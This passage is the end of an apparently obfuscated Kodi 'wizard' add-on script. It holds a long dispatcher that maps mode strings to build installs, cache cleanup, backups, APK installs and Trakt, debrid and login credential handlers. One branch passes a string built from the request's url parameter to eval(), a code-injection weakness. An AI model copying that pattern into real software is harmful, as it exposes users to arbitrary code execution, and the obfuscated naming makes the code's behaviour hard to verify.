	if wiz .getS ('auto-view')=='true':#line:5594
		OOOO0OOO000O0O0O0 =wiz .getS (O0O00OOO0O00O0O0O )#line:5595
		if OOOO0OOO000O0O0O0 =='50'and KODIV >=17 and SKIN =='skin.estuary':OOOO0OOO000O0O0O0 ='55'#line:5596
		if OOOO0OOO000O0O0O0 =='500'and KODIV >=17 and SKIN =='skin.estuary':OOOO0OOO000O0O0O0 ='50'#line:5597
		wiz .ebi ("Container.SetViewMode(%s)"%OOOO0OOO000O0O0O0 )#line:5598
if mode ==None :index ()#line:5600
elif mode =='wizardupdate':wiz .wizardUpdate ()#line:5602
elif mode =='builds':buildMenu ()#line:5603
elif mode =='viewbuild':viewBuild (name )#line:5604
elif mode =='buildinfo':buildInfo (name )#line:5605
elif mode =='buildpreview':buildVideo (name )#line:5606
elif mode =='install':buildWizard (name ,url )#line:5607
elif mode =='theme':buildWizard (name ,mode ,url )#line:5608
elif mode =='viewthirdparty':viewThirdList (name )#line:5609
elif mode =='installthird':thirdPartyInstall (name ,url )#line:5610
elif mode =='editthird':editThirdParty (name );wiz .refresh ()#line:5611
elif mode =='maint':maintMenu (name )#line:5613
elif mode =='passpin':passandpin ()#line:5614
elif mode =='backmyupbuild':backmyupbuild ()#line:5615
elif mode =='kodi17fix':wiz .kodi17Fix ()#line:5616
elif mode =='kodi177fix':wiz .kodi177Fix ()#line:5617
elif mode =='advancedsetting':advancedWindow (name )#line:5618
elif mode =='autoadvanced':showAutoAdvanced ();wiz .refresh ()#line:5619
elif mode =='removeadvanced':removeAdvanced ();wiz .refresh ()#line:5620
elif mode =='asciicheck':wiz .asciiCheck ()#line:5621
elif mode =='backupbuild':wiz .backUpOptions ('build')#line:5622
elif mode =='backupgui':wiz .backUpOptions ('guifix')#line:5623
elif mode =='backuptheme':wiz .backUpOptions ('theme')#line:5624
elif mode =='backupaddon':wiz .backUpOptions ('addondata')#line:5625
elif mode =='oldThumbs':wiz .oldThumbs ()#line:5626
elif mode =='clearbackup':wiz .cleanupBackup ()#line:5627
elif mode =='convertpath':wiz .convertSpecial (HOME )#line:5628
elif mode =='currentsettings':viewAdvanced ()#line:5629
elif mode =='fullclean':totalClean ();wiz .refresh ()#line:5630
elif mode =='clearcache':clearCache ();wiz .refresh ()#line:5631
elif mode =='fixwizard':fixwizard ();wiz .refresh ()#line:5632
elif mode =='fixskin':backtokodi ()#line:5633
elif mode =='testcommand':testcommand ()#line:5634
elif mode =='logsend':logsend ()#line:5635
elif mode =='rdon':rdon ()#line:5636
elif mode =='rdoff':rdoff ()#line:5637
elif mode =='setrd':setrealdebrid ()#line:5638
elif mode =='setrd2':setautorealdebrid ()#line:5639
elif mode =='clearpackages':wiz .clearPackages ();wiz .refresh ()#line:5640
elif mode =='clearcrash':wiz .clearCrash ();wiz .refresh ()#line:5641
elif mode =='clearthumb':clearThumb ();wiz .refresh ()#line:5642
elif mode =='checksources':wiz .checkSources ();wiz .refresh ()#line:5643
elif mode =='checkrepos':wiz .checkRepos ();wiz .refresh ()#line:5644
elif mode =='freshstart':freshStart ()#line:5645
elif mode =='forceupdate':wiz .forceUpdate ()#line:5646
elif mode =='forceprofile':wiz .reloadProfile (wiz .getInfo ('System.ProfileName'))#line:5647
elif mode =='forceclose':wiz .killxbmc ()#line:5648
elif mode =='forceskin':wiz .ebi ("ReloadSkin()");wiz .refresh ()#line:5649
elif mode =='hidepassword':wiz .hidePassword ()#line:5650
elif mode =='unhidepassword':wiz .unhidePassword ()#line:5651
elif mode =='enableaddons':enableAddons ()#line:5652
elif mode =='toggleaddon':wiz .toggleAddon (name ,url );wiz .refresh ()#line:5653
elif mode =='togglecache':toggleCache (name );wiz .refresh ()#line:5654
elif mode =='toggleadult':wiz .toggleAdult ();wiz .refresh ()#line:5655
elif mode =='changefeq':changeFeq ();wiz .refresh ()#line:5656
elif mode =='uploadlog':uploadLog .Main ()#line:5657
elif mode =='viewlog':LogViewer ()#line:5658
elif mode =='viewwizlog':LogViewer (WIZLOG )#line:5659
elif mode =='viewerrorlog':errorChecking (all =True )#line:5660
elif mode =='clearwizlog':f =open (WIZLOG ,'w');f .close ();wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Wizard Log Cleared![/COLOR]"%COLOR2 )#line:5661
elif mode =='purgedb':purgeDb ()#line:5662
elif mode =='fixaddonupdate':fixUpdate ()#line:5663
elif mode =='removeaddons':removeAddonMenu ()#line:5664
elif mode =='removeaddon':removeAddon (name )#line:5665
elif mode =='removeaddondata':removeAddonDataMenu ()#line:5666
elif mode =='removedata':removeAddonData (name )#line:5667
elif mode =='resetaddon':total =wiz .cleanHouse (ADDONDATA ,ignore =True );wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Addon_Data reset[/COLOR]"%COLOR2 )#line:5668
elif mode =='systeminfo':systemInfo ()#line:5669
elif mode =='restorezip':restoreit ('build')#line:5670
elif mode =='restoregui':restoreit ('gui')#line:5671
elif mode =='restoreaddon':restoreit ('addondata')#line:5672
elif mode =='restoreextzip':restoreextit ('build')#line:5673
elif mode =='restoreextgui':restoreextit ('gui')#line:5674
elif mode =='restoreextaddon':restoreextit ('addondata')#line:5675
elif mode =='writeadvanced':writeAdvanced (name ,url )#line:5676
elif mode =='traktsync':traktsync ()#line:5677
elif mode =='apk':apkMenu (name )#line:5679
elif mode =='apkscrape':apkScraper (name )#line:5680
elif mode =='apkinstall':apkInstaller (name ,url )#line:5681
elif mode =='speed':speedMenu ()#line:5682
elif mode =='net':net_tools ()#line:5683
elif mode =='GetList':GetList (url )#line:5684
elif mode =='youtube':youtubeMenu (name )#line:5685
elif mode =='viewVideo':playVideo (url )#line:5686
elif mode =='addons':addonMenu (name )#line:5688
elif mode =='addoninstall':addonInstaller (name ,url )#line:5689
elif mode =='savedata':saveMenu ()#line:5691
elif mode =='togglesetting':wiz .setS (name ,'false'if wiz .getS (name )=='true'else 'true');wiz .refresh ()#line:5692
elif mode =='managedata':manageSaveData (name )#line:5693
elif mode =='whitelist':wiz .whiteList (name )#line:5694
elif mode =='trakt':traktMenu ()#line:5696
elif mode =='savetrakt':traktit .traktIt ('update',name )#line:5697
elif mode =='restoretrakt':traktit .traktIt ('restore',name )#line:5698
elif mode =='addontrakt':traktit .traktIt ('clearaddon',name )#line:5699
elif mode =='cleartrakt':traktit .clearSaved (name )#line:5700
elif mode =='authtrakt':traktit .activateTrakt (name );wiz .refresh ()#line:5701
elif mode =='updatetrakt':traktit .autoUpdate ('all')#line:5702
elif mode =='importtrakt':traktit .importlist (name );wiz .refresh ()#line:5703
elif mode =='realdebrid':realMenu ()#line:5705
elif mode =='savedebrid':debridit .debridIt ('update',name )#line:5706
elif mode =='restoredebrid':debridit .debridIt ('restore',name )#line:5707
elif mode =='addondebrid':debridit .debridIt ('clearaddon',name )#line:5708
elif mode =='cleardebrid':debridit .clearSaved (name )#line:5709
elif mode =='authdebrid':debridit .activateDebrid (name );wiz .refresh ()#line:5710
elif mode =='updatedebrid':debridit .autoUpdate ('all')#line:5711
elif mode =='importdebrid':debridit .importlist (name );wiz .refresh ()#line:5712
elif mode =='login':loginMenu ()#line:5714
elif mode =='savelogin':loginit .loginIt ('update',name )#line:5715
elif mode =='restorelogin':loginit .loginIt ('restore',name )#line:5716
elif mode =='addonlogin':loginit .loginIt ('clearaddon',name )#line:5717
elif mode =='clearlogin':loginit .clearSaved (name )#line:5718
elif mode =='authlogin':loginit .activateLogin (name );wiz .refresh ()#line:5719
elif mode =='updatelogin':loginit .autoUpdate ('all')#line:5720
elif mode =='importlogin':loginit .importlist (name );wiz .refresh ()#line:5721
elif mode =='contact':notify .contact (CONTACT )#line:5723
elif mode =='settings':wiz .openS (name );wiz .refresh ()#line:5724
elif mode =='opensettings':id =eval (url .upper ()+'ID')[name ]['plugin'];addonid =wiz .addonId (id );addonid .openSettings ();wiz .refresh ()#line:5725
elif mode =='developer':developer ()#line:5727
elif mode =='converttext':wiz .convertText ()#line:5728
elif mode =='createqr':wiz .createQR ()#line:5729
elif mode =='testnotify':testnotify ()#line:5730
elif mode =='testnotify2':testnotify2 ()#line:5731
elif mode =='servicemanual':servicemanual ()#line:5732
elif mode =='fastinstall':fastinstall ()#line:5733
elif mode =='testupdate':testupdate ()#line:5734
elif mode =='testfirst':testfirst ()#line:5735
elif mode =='testfirstrun':testfirstRun ()#line:5736
elif mode =='testapk':notify .apkInstaller ('SPMC')#line:5737
elif mode =='bg':wiz .bg_install (name ,url )#line:5739
elif mode =='bgcustom':wiz .bg_custom ()#line:5740
elif mode =='bgremove':wiz .bg_remove ()#line:5741
elif mode =='bgdefault':wiz .bg_default ()#line:5742
elif mode =='rdset':rdsetup ()#line:5743
elif mode =='mor':morsetup ()#line:5744
elif mode =='mor2':morsetup2 ()#line:5745
elif mode =='resolveurl':resolveurlsetup ()#line:5746
elif mode =='urlresolver':urlresolversetup ()#line:5747
elif mode =='forcefastupdate':forcefastupdate ()#line:5748
elif mode =='traktset':traktsetup ()#line:5749
elif mode =='placentaset':placentasetup ()#line:5750
elif mode =='flixnetset':flixnetsetup ()#line:5751
elif mode =='reptiliaset':reptiliasetup ()#line:5752
elif mode =='yodasset':yodasetup ()#line:5753
elif mode =='numbersset':numberssetup ()#line:5754
elif mode =='uranusset':uranussetup ()#line:5755
elif mode =='genesisset':genesissetup ()#line:5756
elif mode =='fastupdate':fastupdate ()#line:5757
elif mode =='folderback':folderback ()#line:5758
elif mode =='menudata':Menu ()#line:5759
elif mode ==2 :#line:5761
        wiz .torent_menu ()#line:5762
elif mode ==3 :#line:5763
        wiz .popcorn_menu ()#line:5764
elif mode ==8 :#line:5765
        wiz .metaliq_fix ()#line:5766
elif mode ==9 :#line:5767
        wiz .quasar_menu ()#line:5768
elif mode ==5 :#line:5769
        swapSkins ('skin.Premium.mod')#line:5770
elif mode ==13 :#line:5771
        wiz .elementum_menu ()#line:5772
elif mode ==16 :#line:5773
        wiz .fix_wizard ()#line:5774
elif mode ==17 :#line:5775
        wiz .last_play ()#line:5776
elif mode ==18 :#line:5777
        wiz .normal_metalliq ()#line:5778
elif mode ==19 :#line:5779
        wiz .fast_metalliq ()#line:5780
elif mode ==20 :#line:5781
        wiz .fix_buffer2 ()#line:5782
elif mode ==21 :#line:5783
        wiz .fix_buffer3 ()#line:5784
elif mode ==11 :#line:5785
        wiz .fix_buffer ()#line:5786
elif mode ==15 :#line:5787
        wiz .fix_font ()#line:5788
elif mode ==14 :#line:5789
        wiz .clean_pass ()#line:5790
elif mode ==22 :#line:5791
        wiz .movie_update ()#line:5792
elif mode =='adv_settings':buffer1 ()#line:5793
elif mode =='getpass':getpass ()#line:5794
elif mode =='setpass':setpass ()#line:5795
elif mode =='setuname':setuname ()#line:5796
elif mode =='passandUsername':passandUsername ()#line:5797
elif mode =='9':disply_hwr ()#line:5798
elif mode =='99':disply_hwr2 ()#line:5799
xbmcplugin .endOfDirectory (int (sys .argv [1 ]))